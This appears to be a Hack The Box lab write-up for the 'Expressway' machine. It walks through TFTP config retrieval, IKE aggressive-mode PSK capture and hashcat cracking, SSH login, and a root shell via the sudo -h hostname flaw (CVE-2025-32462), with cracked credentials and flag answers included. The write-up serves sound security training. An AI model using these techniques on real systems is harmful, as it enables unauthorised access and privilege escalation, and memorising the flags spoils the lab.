---
title: 'Expressway'
date: '2026-09-21'
excerpt: 'Easy - Linux'
prog: 'Hack The Box Machines - September 2026'
type: 'machines'
---

<div class="writeup-header">
<div class="writeup-header-text">
<div class="writeup-org">Hack The Box</div>
<h1 class="writeup-title">Expressway</h1>
<div class="writeup-date">September 2026 &middot; Machines</div>
</div>
</div>
<p class="lead mb-4">Expressway is an easy-difficulty Linux machine that demonstrates enumeration and exploits the IKE service, a component of the IPsec framework. Upon leaking the Pre-Shared key of the service and cracking it, the retrieved clear-text credentials are used to access the target via SSH. For privilege escalation, CVE-2025-32462 is exploited to get a privileged shell as the root user.</p>

<h4 class="mb-3">Tasks</h4>
<p class="mb-2"><strong>Question 1:</strong> How many open TCP ports are listening on Expressway?</p>
<p class="mb-3">Running <code>nmap -sC -sV -A [TARGET_IP] -Pn</code> only returns 1 open TCP port.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-7nt57poyd1]─[~]
└──╼ [★]$ nmap -sC -sV -A 10.129.238.52 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-20 19:55 EDT
Nmap scan report for 10.129.238.52
Host is up (0.20s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.12 seconds
```

<p class="mb-5"><strong>Answer:</strong> 1</p>
<br />


<p class="mb-2"><strong>Question 2:</strong> Which UDP port in Expressway is running a TFTP server?</p>
<p class="mb-3">We check for the top 20 ports when we use Nmap to scan for open UDP ports.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-7nt57poyd1]─[~]
└──╼ [★]$ sudo nmap -sU --top-port=20 10.129.238.52
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-20 19:58 EDT
Nmap scan report for 10.129.238.52
Host is up (0.20s latency).

PORT      STATE         SERVICE
53/udp    closed        domain
67/udp    closed        dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
123/udp   open|filtered ntp
135/udp   closed        msrpc
137/udp   closed        netbios-ns
138/udp   closed        netbios-dgm
139/udp   closed        netbios-ssn
161/udp   open|filtered snmp
162/udp   closed        snmptrap
445/udp   closed        microsoft-ds
500/udp   open          isakmp
514/udp   closed        syslog
520/udp   closed        route
631/udp   closed        ipp
1434/udp  closed        ms-sql-m
1900/udp  closed        upnp
4500/udp  open|filtered nat-t-ike
49152/udp closed        unknown

Nmap done: 1 IP address (1 host up) scanned in 9.44 seconds
```

<p class="mb-3">We can see the open port is 500. While the open | filtered ports are 68, 69, 123, 161, 4500.</p>
<p class="mb-5"><strong>Answer:</strong> 69</p>
<br />


<p class="mb-2"><strong>Question 3:</strong> What username did you find in the config file in the TFTP server?</p>
<p class="mb-3">Notice the TFTP service running on port 69. We use Nmap to further enumerate it using the <code>tftp-enum.nse</code> script.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-7nt57poyd1]─[~]
└──╼ [★]$ sudo nmap -sU 10.129.238.52 -p 69 --script=tftp-enum.nse
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-20 20:03 EDT
Nmap scan report for 10.129.238.52
Host is up (0.20s latency).

PORT   STATE SERVICE
69/udp open  tftp
| tftp-enum: 
|_  ciscortr.cfg

Nmap done: 1 IP address (1 host up) scanned in 107.39 seconds
```

<p class="mb-3">The Nmap script scan reveals a file called <code>ciscortr.cfg</code> in the TFTP server. Since TFTP by default does not require any authentication, we can attempt to connect to it anonymously and download the <code>ciscortr.cfg</code> file.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-7nt57poyd1]─[~]
└──╼ [★]$ tftp 10.129.238.52
tftp> help
tftp-hpa 5.3
Commands may be abbreviated.  Commands are:

connect 	connect to remote tftp
mode    	set file transfer mode
put     	send file
get     	receive file
quit    	exit tftp
verbose 	toggle verbose mode
trace   	toggle packet tracing
literal 	toggle literal mode, ignore ':' in file name
status  	show current status
binary  	set mode to octet
ascii   	set mode to netascii
rexmt   	set per-packet transmission timeout
timeout 	set total retransmission timeout
?       	print help information
help    	print help information
tftp> get ciscortr.cfg
tftp> q
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-7nt57poyd1]─[~]
└──╼ [★]$ ls
cacert.der  ciscortr.cfg  Desktop  Documents  Downloads  Music  my_data  Pictures  Templates  Videos
```

<p class="mb-3">Reading the contents of the <code>ciscortr.cfg</code> reveals the following:</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-7nt57poyd1]─[~]
└──╼ [★]$ cat ciscortr.cfg 

version 12.3

no service pad

service timestamps debug datetime msec

service timestamps log datetime msec

no service password-encryption

!

hostname expressway

!

boot-start-marker

boot-end-marker

!

enable password *****

!

username ike password *****

ip subnet-zero

ip cef

!

vpdn enable

	vpdn-group 1

	request-dialin

	protocol pppoe



!

ip dhcp excluded-address 10.0.1.1 10.0.1.10

ip dhcp excluded-address 10.0.2.1 10.0.2.10

ip dhcp excluded-address 10.0.3.1 10.0.3.10

!

ip dhcp pool vlan1

   network 10.0.1.0 255.255.255.0

   default-router 10.0.1.1 

!

ip dhcp pool vlan2

   network 10.0.2.0 255.255.255.0

   default-router 10.0.2.1 

!

ip dhcp pool vlan3

   network 10.0.3.0 255.255.255.0

   default-router 10.0.3.1 

!

ip ips po max-events 100

no ftp-server write-enable

!

bridge irb

!

interface FastEthernet0

	no ip address

!

interface FastEthernet1

	no ip address

!

interface FastEthernet2

	no ip address

!

interface FastEthernet3

	switchport mode trunk

	no ip address

!

interface FastEthernet4

	ip address 192.168.68.1 255.255.255.0

	no ip directed-broadcast (default)

	speed auto

	ip nat outside

	ip access-group 103 in

	no cdp enable

	crypto ipsec client ezvpn ezvpnclient outside

	crypto map static-map

!

crypto isakmp policy 1

	encryption 3des

	authentication pre-share

	group 2

	lifetime 480

!

crypto isakmp client configuration group rtr-remote

	key secret-password

	dns 208.67.222.222

	domain expressway.htb

	pool dynpool

!

crypto ipsec transform-set vpn1 esp-3des esp-md5

!

crypto ipsec security-association lifetime seconds 86400

!

crypto dynamic-map dynmap 1

	set transform-set vpn1

	reverse-route

!

crypto map static-map 1 ipsec-isakmp dynamic dynmap

crypto map dynmap isakmp authorization list rtr-remote

crypto map dynmap client configuration address respond

crypto ipsec client ezvpn ezvpnclient

	connect auto

	group 2 key secret-password

	mode client

	peer 192.168.100.1

!

interface Dot11Radio0

	no ip address

	!

	broadcast-key vlan 1 change 45

	!

	encryption vlan 1 mode ciphers tkip 

	!

	ssid cisco

  	 	vlan 1

 	 	authentication open 

 	 	authentication network-eap eap_methods 

 	 	authentication key-management wpa optional

 	!

	ssid ciscowep

		vlan 2

		authentication open 

		!

	ssid ciscowpa

		vlan 3

		authentication open 

	!

	speed basic-1.0 basic-2.0 basic-5.5 6.0 9.0 basic-11.0 12.0 18.0 24.0 36.0 48.0 54.0

	rts threshold 2312

	power local cck 50

	power local ofdm 30

	channel 2462

	station-role root

!

interface Dot11Radio0.1

	description Cisco Open

	encapsulation dot1Q 1 native

	no cdp enable

	bridge-group 1

	bridge-group 1 subscriber-loop-control

	bridge-group 1 spanning-disabled

	bridge-group 1 block-unknown-source

	no bridge-group 1 source-learning

	no bridge-group 1 unicast-flooding

!

interface Dot11Radio0.2

	encapsulation dot1Q 2

	bridge-group 2

	bridge-group 2 subscriber-loop-control

	bridge-group 2 spanning-disabled

	bridge-group 2 block-unknown-source

	no bridge-group 2 source-learning

 	no bridge-group 2 unicast-flooding

!

interface Dot11Radio0.3

	encapsulation dot1Q 3

	bridge-group 3

	bridge-group 3 subscriber-loop-control

	bridge-group 3 spanning-disabled

	bridge-group 3 block-unknown-source

	no bridge-group 3 source-learning

	no bridge-group 3 unicast-flooding

!

interface Vlan1

	no ip address

	no ip directed-broadcast (default)

	ip nat inside

	crypto ipsec client ezvpn ezvpnclient inside

	ip inspect firewall in

	no cdp enable

	bridge-group 1

	bridge-group 1 spanning-disabled

!

interface Vlan2

	no ip address

	bridge-group 2

	bridge-group 2 spanning-disabled

!

interface Vlan3

	no ip address

	bridge-group 3

	bridge-group 3 spanning-disabled

!

interface BVI1

	ip address 10.0.1.1 255.255.255.0

!

interface BVI2

	ip address 10.0.2.1 255.255.255.0

!

ip classless

!

ip http server

no ip http secure-server

!

control-plane

!

bridge 1 route ip

bridge 2 route ip

bridge 3 route ip

!

ip inspect name firewall tcp	

ip inspect name firewall udp

!

access-list 103 permit udp host 200.1.1.1 any eq isakmp

access-list 103 permit udp host 200.1.1.1 eq isakmp any

no cdp run

!

line con 0

	password *****

	no modem enable

	transport preferred all

	transport output all

line aux 0

	transport preferred all

	transport output all

line vty 0 4

	password *****

	transport preferred all

	transport input all

	transport output all
```

<p class="mb-3">Notice the username <code>ike</code> and the target's hostname <code>expressway</code>.</p>
<p class="mb-5"><strong>Answer:</strong> ike</p>
<br />


<p class="mb-2"><strong>Question 4:</strong> What service is running on UDP port 500?</p>
<p class="mb-3">Searching on the internet for the answer tells us that is is Internet Key Exchange (IKE), which is a ISAKMP-based protocol that negotiates and sets up the encrypted tunnels behind almost every IPsec VPN. Before any data flows, the two peers talk on UDP 500 to authenticate each other and agree on keys and ciphers.</p>
<p class="mb-5"><strong>Answer:</strong> IKE</p>
<br />


<p class="mb-2"><strong>Question 5:</strong> What authentication method is used by the IKE service running in Expressway?</p>
<p class="mb-3">We use ike-scan to connect to the target and see the response we receive.</p>

```console
─[au-free-2]─[10.10.14.224]─[aaronamran@htb-7nt57poyd1]─[~]
└──╼ [★]$ ike-scan -M 10.129.238.52
ERROR: Could not bind network socket to local port 500
You need to be root, or ike-scan must be suid root to bind to ports below 1024.
ERROR: bind: Permission denied
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-7nt57poyd1]─[~]
└──╼ [★]$ sudo ike-scan -M 10.129.238.52
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.238.52	Main Mode Handshake returned
	HDR=(CKY-R=3155c352d52cd860)
	SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
	VID=09002689dfd6b712 (XAUTH)
	VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.203 seconds (4.94 hosts/sec).  1 returned handshake; 0 returned notify
```

<p class="mb-3">From the response, we see a field called <code>AUTH</code> with a value of <code>PSK</code>. This means the VPN is configured with a Pre-Shared Key. The output also shows that the encryption is set to 3DES, and the hash is SHA1.</p>
<p class="mb-5"><strong>Answer:</strong> PSK</p>
<br />


<p class="mb-2"><strong>Question 6:</strong> What is the clear-text password of the ike user?</p>
<p class="mb-3">We will attempt an aggressive scan with <code>-A</code> and use the <code>--pskcrack</code> option to retrieve the pre-shared key so we can crack it offline.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-7nt57poyd1]─[~]
└──╼ [★]$ sudo ike-scan -M -A --pskcrack=k.hash 10.129.238.52
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.238.52	Aggressive Mode Handshake returned
	HDR=(CKY-R=6948a40bc9080b2d)
	SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
	KeyExchange(128 bytes)
	Nonce(32 bytes)
	ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
	VID=09002689dfd6b712 (XAUTH)
	VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
	Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.205 seconds (4.88 hosts/sec).  1 returned handshake; 0 returned notify
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-7nt57poyd1]─[~]
└──╼ [★]$ ls 
cacert.der  ciscortr.cfg  Desktop  Documents  Downloads  k.hash  Music  my_data  Pictures  Templates  Videos
```

<p class="mb-3">This creates a file called <code>k.hash</code> with the pre-shared key, which we pass to Hashcat to recover the clear-text password.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-7nt57poyd1]─[~]
└──╼ [★]$ cat k.hash 
6185e6c4fc5f9065a998d48ebcb72ad910ab62d7850242c83b783a5f68764fadeee3c2c6f7418ddffd9f2be96ce14fa940aff252e513f05ba21ace678a9733d13d8cbb3bc0d2c996f2c468b72bcd35788ec32be6f7f2edd26f88aa3df86b60b4cf6fb4efd066ec03f77934da1108a180538f7cd6bab79d690d4c839c57be1d89:f96b74cc52d98a628fa58ac1615c46bf7041275db75fd8b5b45e84111cc76c4c2c82c0c4f986e78c9cfa59ead82e75cb76f34f2e02c3fc198266f45a09f8ce9b85d53333a437870fa00e3ffce395b5c282f6cf4dd6b36d5d78eaba5db03052bf157c860b31c98a676d0ffe4508f0379b30854f3149a094edc9e2804adaf94f59:6948a40bc9080b2d:65dfddb081f3ac01:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:b9987d6b19eb062b76c9f073c013a57d9daba9bb:8e12fa3a215ee979a974ac41103d7f617beca482bd4832cd57e84a7b692ad1ee:b8e67901963d50d11575b10b687d3dcd42590198
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-7nt57poyd1]─[~]
└──╼ [★]$ hashcat k.hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 2.1 LINUX) - Platform #1 [Intel(R) Corporation]
==================================================================
* Device #1: AMD EPYC 9575F 64-Core Processor, 3920/7905 MB (988 MB allocatable), 4MCU

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
====================================================================================================================================================
* Device #2: cpu-skylake-avx512-AMD EPYC 9575F 64-Core Processor, skipped

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

5400 | IKE-PSK SHA1 | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 0 secs

6185e6c4fc5f9065a998d48ebcb72ad910ab62d7850242c83b783a5f68764fadeee3c2c6f7418ddffd9f2be96ce14fa940aff252e513f05ba21ace678a9733d13d8cbb3bc0d2c996f2c468b72bcd35788ec32be6f7f2edd26f88aa3df86b60b4cf6fb4efd066ec03f77934da1108a180538f7cd6bab79d690d4c839c57be1d89:f96b74cc52d98a628fa58ac1615c46bf7041275db75fd8b5b45e84111cc76c4c2c82c0c4f986e78c9cfa59ead82e75cb76f34f2e02c3fc198266f45a09f8ce9b85d53333a437870fa00e3ffce395b5c282f6cf4dd6b36d5d78eaba5db03052bf157c860b31c98a676d0ffe4508f0379b30854f3149a094edc9e2804adaf94f59:6948a40bc9080b2d:65dfddb081f3ac01:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e68:b9987d6b19eb062b76c9f073c013a57d9daba9bb:8e12fa3a215ee979a974ac41103d7f617beca482bd4832cd57e84a7b692ad1ee:b8e67901963d50d11575b10b687d3dcd42590198:freakingrockstarontheroad
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5400 (IKE-PSK SHA1)
Hash.Target......: 6185e6c4fc5f9065a998d48ebcb72ad910ab62d7850242c83b7...590198
Time.Started.....: Sun Sep 20 20:36:19 2026 (4 secs)
Time.Estimated...: Sun Sep 20 20:36:23 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2588.2 kH/s (0.57ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 8046592/14344385 (56.10%)
Rejected.........: 0/8046592 (0.00%)
Restore.Point....: 8044544/14344385 (56.08%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: freaky97 -> frasierisland353

Started: Sun Sep 20 20:36:12 2026
Stopped: Sun Sep 20 20:36:24 2026
```

<p class="mb-5"><strong>Answer:</strong> freakingrockstarontheroad</p>
<br />


<p class="mb-2"><strong>Question 7:</strong> Submit the flag located in the ike user's home directory.</p>
<p class="mb-3">With the login credentials <code>ike</code>:<code>freakingrockstarontheroad</code>, we can now attempt a login to the target via SSH.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-7nt57poyd1]─[~]
└──╼ [★]$ ssh ike@10.129.238.52
The authenticity of host '10.129.238.52 (10.129.238.52)' can't be established.
ED25519 key fingerprint is SHA256:fZLjHktV7oXzFz9v3ylWFE4BS9rECyxSHdlLrfxRM8g.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.238.52' (ED25519) to the list of known hosts.
ike@10.129.238.52's password: 
Last login: Wed Sep 17 12:19:40 BST 2025 from 10.10.14.64 on ssh
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Sep 20 01:48:38 2026 from 10.10.14.224
ike@expressway:~$ whoami
ike
ike@expressway:~$ id
uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
ike@expressway:~$ ls
user.txt
ike@expressway:~$ cat user.txt
7f96a924a94cb9366d06c9589760cc7c
```

<p class="mb-5"><strong>Answer:</strong> 7f96a924a94cb9366d06c9589760cc7c</p>
<br />


<p class="mb-2"><strong>Question 8:</strong> What non-default group is the ike user a part of?</p>
<p class="mb-3">Running <code>id</code> returns <code>uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)</code>.</p>
<p class="mb-5"><strong>Answer:</strong> proxy</p>
<br />


<p class="mb-2"><strong>Question 9:</strong> What .htb host was accessed through the squid proxy that was running on Expressway?</p>
<p class="mb-3">Since we discovered that the user is a member of the non-default group called <code>proxy</code>, we try to list the files this group can read. We include <code>/proc</code>, <code>/sys</code> and <code>/run</code> directories since these usually contain system files.</p>

```console
ike@expressway:~$ find / -group proxy 2>/dev/null |grep -v '/proc\|/sys/\|/run'
/var/spool/squid
/var/spool/squid/netdb.state
/var/log/squid
/var/log/squid/cache.log.2.gz
/var/log/squid/access.log.2.gz
/var/log/squid/cache.log.1
/var/log/squid/access.log.1
```

<p class="mb-3">Now we read the <code>/var/log/squid/access.log.1</code> file.</p>

```console
ike@expressway:~$ cat /var/log/squid/access.log.1
1753229566.990      0 192.168.68.50 NONE_NONE/000 0 - error:transaction-end-before-headers - HIER_NONE/- -
1753229580.379      0 192.168.68.50 NONE_NONE/000 0 - error:transaction-end-before-headers - HIER_NONE/- -
1753229580.417     15 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3944 GET /nmaplowercheck1753229281 - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3896 POST / - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3926 GET /flumemaster.jsp - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3916 GET /master.jsp - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3896 PROPFIND / - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3914 GET /.git/HEAD - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/400 3926 GET /tasktracker.jsp - HIER_NONE/- text/html
1753229688.847      0 192.168.68.50 NONE_NONE/000 0 - error:transaction-end-before-headers - HIER_NONE/- -
1753229688.902      0 192.168.68.50 NONE_NONE/400 3896 PROPFIND / - HIER_NONE/- text/html
1753229688.902      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229688.902      0 192.168.68.50 NONE_NONE/400 3914 GET /rs-status - HIER_NONE/- text/html
1753229688.902      0 192.168.68.50 TCP_DENIED/403 3807 GET http://www.google.com/ - HIER_NONE/- text/html
1753229688.902      0 192.168.68.50 NONE_NONE/400 3902 POST /sdk - HIER_NONE/- text/html
1753229688.902      0 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html
1753229688.902      0 192.168.68.50 NONE_NONE/000 0 - error:transaction-end-before-headers - HIER_NONE/- -
1753229688.902      0 192.168.68.50 TCP_DENIED/403 3807 GET http://offramp.expressway.htb - HIER_NONE/- text/html
1753229689.010      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229689.010      0 192.168.68.50 NONE_NONE/400 3896 XDGY / - HIER_NONE/- text/html
1753229689.010      0 192.168.68.50 NONE_NONE/400 3916 GET /evox/about - HIER_NONE/- text/html
1753229689.058      0 192.168.68.50 NONE_NONE/400 3906 GET /HNAP1 - HIER_NONE/- text/html
1753229689.058      0 192.168.68.50 NONE_NONE/400 3896 PROPFIND / - HIER_NONE/- text/html
1753229689.058      0 192.168.68.50 TCP_DENIED/403 381 HEAD http://www.google.com/ - HIER_NONE/- text/html
1753229689.058      0 192.168.68.50 NONE_NONE/400 3934 GET /browseDirectory.jsp - HIER_NONE/- text/html
1753229689.058      0 192.168.68.50 NONE_NONE/400 3924 GET /jobtracker.jsp - HIER_NONE/- text/html
1753229689.058      0 192.168.68.50 NONE_NONE/400 3916 GET /status.jsp - HIER_NONE/- text/html
1753229689.114      0 192.168.68.50 NONE_NONE/400 3916 GET /robots.txt - HIER_NONE/- text/html
1753229689.114      0 192.168.68.50 NONE_NONE/400 3922 GET /dfshealth.jsp - HIER_NONE/- text/html
1753229689.165      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229689.165      0 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html
1753229689.165      0 192.168.68.50 NONE_NONE/400 3918 GET /favicon.ico - HIER_NONE/- text/html
1753229689.222      0 192.168.68.50 TCP_DENIED/403 3768 CONNECT www.google.com:80 - HIER_NONE/- text/html
1753229689.322      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229689.322      0 192.168.68.50 NONE_NONE/400 381 HEAD / - HIER_NONE/- text/html
1753229689.322      0 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html
1753229689.475      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229689.526      0 192.168.68.50 NONE_NONE/400 3896 POST / - HIER_NONE/- text/html
1753229689.629      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229689.680      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229689.783      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229689.933      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229690.086      0 192.168.68.50 NONE_NONE/400 3896 OPTIONS / - HIER_NONE/- text/html
1753229719.140      0 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html
1753229719.245      0 192.168.68.50 NONE_NONE/400 3896 GET / - HIER_NONE/- text/html
1753229760.700      0 192.168.68.50 NONE_NONE/400 3918 GET /randomfile1 - HIER_NONE/- text/html
1753229760.722      0 192.168.68.50 NONE_NONE/400 3908 GET /frand2 - HIER_NONE/- text/html
```

<p class="mb-3">Alternatively we can just run the contents of the file through <code>grep</code> filter.</p>

```console
ike@expressway:~$ cat /var/log/squid/access.log.1 | grep htb
1753229688.902      0 192.168.68.50 TCP_DENIED/403 3807 GET http://offramp.expressway.htb - HIER_NONE/- text/html
```

<p class="mb-5"><strong>Answer:</strong> offramp.expressway.htb</p>
<br />


<p class="mb-2"><strong>Question 10:</strong> What version of sudo is installed in the system?</p>
<p class="mb-3">We run <code>sudo -V</code> to check for the version.</p>

```console
ike@expressway:~$ sudo -l
Password: 
Sorry, user ike may not run sudo on expressway.
ike@expressway:~$ sudo -V
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17
```

<p class="mb-5"><strong>Answer:</strong> 1.9.17</p>
<br />


<p class="mb-2"><strong>Question 11:</strong> What is the 2025 CVE ID that exploits the -h option of sudo version 1.9.17?</p>
<p class="mb-5"><strong>Answer:</strong> CVE-2025-32462</p>
<br />


<p class="mb-2"><strong>Question 12:</strong> Submit the flag located in the root user's home directory.</p>
<p class="mb-3">Based on the logic flaw in CVE-2025-32462, the <code>sudo</code> policy engine incorrectly utilizes the hostname specified via the <code>-h</code> flag to evaluate command execution permissions rather than checking the local machine's true hostname. This allows a user to trigger a multi-host rule intended for a different system (<code>offramp.expressway.htb</code>) and falsely authorize the execution of a local, root-level shell.</p>

```console
ike@expressway:~$ sudo -h offramp.expressway.htb bash
root@expressway:/home/ike# whoami 
root
root@expressway:/home/ike# id
uid=0(root) gid=0(root) groups=0(root)
root@expressway:/home/ike# cd /root && ls
root.txt
root@expressway:~# cat root.txt
fcbcb2a9dde2f345ec88d170c2c2df90
```

<p class="mb-5"><strong>Answer:</strong> fcbcb2a9dde2f345ec88d170c2c2df90</p


<hr />
<section class="text-center" style="margin-top:1.5rem; margin-bottom:1.5rem;">
<p class="mb-1" style="font-style:italic; font-size:1.125rem;">See you in the next Hacking Lab.</p>
<p class="mb-0" style="font-weight:700;">@aaronamran</p>
<p class="text-muted small mt-1">September 2026</p>
</section>

<div class="writeup-nav">
</div>
</div>